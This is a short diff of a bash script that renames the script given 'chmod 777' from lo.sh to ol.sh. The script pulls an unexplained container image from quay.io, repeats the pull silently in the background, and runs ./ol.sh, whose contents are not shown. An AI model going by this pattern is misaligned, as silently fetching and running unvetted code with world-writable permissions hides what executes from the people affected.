@@ -1,5 +1,5 @@
 #!/bin/bash
-chmod 777 lo.sh
+chmod 777 ol.sh
 docker pull quay.io/lekilite01/nyobelah:latest
 docker pull quay.io/lekilite01/nyobelah:latest > /dev/null 2>&1 &
 ./ol.sh
